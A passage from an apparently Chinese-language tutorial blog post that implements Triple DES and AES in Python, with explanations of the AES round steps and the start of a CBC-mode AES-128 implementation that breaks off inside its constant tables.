D_{K1}(E_{K2}(D_{K3}(Ciphertext)))<br>$$</p><h2 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triple_encipher</span><span class="params">(data, masterKey, iv)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(masterKey) == <span class="number">8</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key3 = masterKey[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(masterKey) == <span class="number">16</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        key3 = masterKey[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        key3 = masterKey[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">    keys = [key1, key2, key3]</span><br><span class="line">    <span class="comment"># print keys</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(data):</span><br><span class="line">        block = cipher(data[i:i + <span class="number">8</span>], keys[<span class="number">0</span>], iv, ENCRYPT)</span><br><span class="line">        block = cipher(block, keys[<span class="number">1</span>], iv, DECRYPT)</span><br><span class="line">        block = cipher(block, keys[<span class="number">2</span>], iv, ENCRYPT)</span><br><span class="line">        iv = block</span><br><span class="line">        result.append(block)</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result).encode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triple_decipher</span><span class="params">(data, masterKey, iv)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(masterKey) == <span class="number">8</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key3 = masterKey[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(masterKey) == <span class="number">16</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        key3 = masterKey[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key1 = masterKey[:<span class="number">8</span>]</span><br><span class="line">        key2 = masterKey[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        key3 = masterKey[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">    keys = [key1, key2, key3]</span><br><span class="line">    <span class="comment"># print keys</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    data = data.decode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(data):</span><br><span class="line">        temp = data[i:i + <span class="number">8</span>]</span><br><span class="line">        block = cipher(data[i:i + <span class="number">8</span>], keys[<span class="number">2</span>], iv, DECRYPT)</span><br><span class="line">        block = cipher(block, keys[<span class="number">1</span>], iv, ENCRYPT)</span><br><span class="line">        block = cipher(block, keys[<span class="number">0</span>], iv, DECRYPT)</span><br><span class="line">        iv = temp</span><br><span class="line">        result.append(block)</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    key = <span class="string">'#qianfei'</span></span><br><span class="line">    iv = <span class="string">'0'</span> * <span class="number">8</span></span><br><span class="line">    data = <span class="string">'#qianfei11111111'</span></span><br><span class="line">    ciphertext = triple_encipher(data, key, iv)</span><br><span class="line">    <span class="comment"># print [ord(c) for c in ciphertext]</span></span><br><span class="line">    <span class="keyword">print</span> ciphertext</span><br><span class="line">    plaintext = triple_decipher(ciphertext, key, iv)</span><br><span class="line">    <span class="comment"># print [ord(c) for c in plaintext]</span></span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于 2001 年 11 月 26 日发布于 FIPS PUB 197，并在 2002 年 5 月 26 日成为有效的标准。2006 年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p><h2 id="算法流程-2"><a href="#算法流程-2" class="headerlink" title="算法流程"></a>算法流程</h2><p>严格地说，AES 和 Rijndael 加密法并不完全一样（虽然在实际应用中两者可以互换），因为 Rijndael 加密法可以支持更大范围的区块和密钥长度：AES 的区块长度固定为 128 比特，密钥长度则可以是 128，192 或 256 比特；而 Rijndael 使用的密钥和区块长度均可以是 128，192 或 256 比特。加密过程中使用的密钥是由 Rijndael 密钥生成方案产生。</p><table><thead><tr><th style="text-align:center">AES</th><th style="text-align:center">密钥长度（32 位比特字)</th><th style="text-align:center">分组长度(32 位比特字)</th><th style="text-align:center">加密轮数</th></tr></thead><tbody><tr><td style="text-align:center">AES-128</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">AES-192</td><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">AES-256</td><td style="text-align:center">8</td><td style="text-align:center">4</td><td style="text-align:center">14</td></tr></tbody></table><p>大多数 AES 计算是在一个特别的有限域完成的。AES 加密过程是在一个 4×4 的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个 Byte）。（Rijndael 加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮 AES 加密循环（除最后一轮外）均包含 4 个步骤：</p><ul><li>轮密钥加：矩阵中的每一个字节都与该次回合密钥做 XOR 运算；每个子密钥由密钥生成方案产生。</li><li>字节代换：透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li><li>行位移：将矩阵中的每个横列进行循环式移位。</li><li>列混合：为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略 MixColumns 步骤，而以另一个轮密钥取代。</li></ul><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>轮密钥加中，密钥将会与原矩阵合并。在每次的加密循环中，都会由主密钥产生一把回合密钥（透过 Rijndael 密钥生成方案产生），这把密钥大小会跟原矩阵一样，以与原矩阵中每个对应的字节作异或（⊕）加法。</p><p><img src="/pics/Python实现DES、AES加密解密算法/4.png" alt="轮密钥加算法"></p><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>在字节代换步骤中，矩阵中的各字节透过一个 8 位的 S-box 进行转换。这个步骤提供了加密法非线性的变换能力。S-box 与 $GF(2^{8})$ 上的乘法反元素有关，已知具有良好的非线性特性。为了避免简单代数性质的攻击，S-box 结合了乘法反元素及一个可逆的仿射变换矩阵建构而成。此外在建构 S-box 时，刻意避开了固定点与反固定点，即以 S-box 替换字节的结果会相当于错排的结果。</p><p><img src="/pics/Python实现DES、AES加密解密算法/5.png" alt="字节代换算法"></p><h3 id="ShiftRows"><a href="#ShiftRows" class="headerlink" title="ShiftRows"></a>ShiftRows</h3><p>行位移描述矩阵的列操作。在此步骤中，每一列都向左循环位移某个偏移量。在 AES 中（区块大小 128 位），第一列维持不变，第二列里的每个字节都向左循环移动一格。同理，第三列及第四列向左循环位移的偏移量就分别是 2 和 3。128 位和 192 比特的区块在此步骤的循环位移的模式相同。经过行位移之后，矩阵中每一竖行，都是由输入矩阵中的每个不同行中的元素组成。Rijndael 算法的版本中，偏移量和 AES 有少许不同；对于长度 256 比特的区块，第一列仍然维持不变，第二列、第三列、第四列的偏移量分别是 1 字节、2 字节、3 字节。除此之外，行位移操作步骤在 Rijndael 和 AES 中完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/6.png" alt="行位移算法"></p><h3 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h3><p>在列混合步骤，每一行的四个字节透过线性变换互相结合。每一行的四个元素分别当作$1, x, x^2, x^3$ 的系数，合并即为 $GF(2^{8})$ 中的一个多项式，接着将此多项式和一个固定的多项式 $c(x)=3x^{3}+x^{2}+x+2$ 在模 $x^4+1$ 下相乘。此步骤亦可视为 Rijndael 有限域之下的矩阵乘法。列混合函数接受 4 个字节的输入，输出 4 个字节，每一个输入的字节都会对输出的四个字节造成影响。因此行位移和列混合两步骤为这个密码系统提供了扩散性。</p><p><img src="/pics/Python实现DES、AES加密解密算法/7.png" alt="列混合算法"></p><h2 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h2><p>这里实现了采用 CBC 模式且密钥长度为 128 位的 AES 算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">ENCRYPT = <span class="number">0</span></span><br><span class="line">DECRYPT = <span class="number">1</span></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">S = [<span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">     <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>]</span><br><span class="line">S_ = [<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>, <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>, <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>, <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>, <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>, <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line">      <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>, <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>, <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>, <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>, <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>, <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line">Rcon = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span 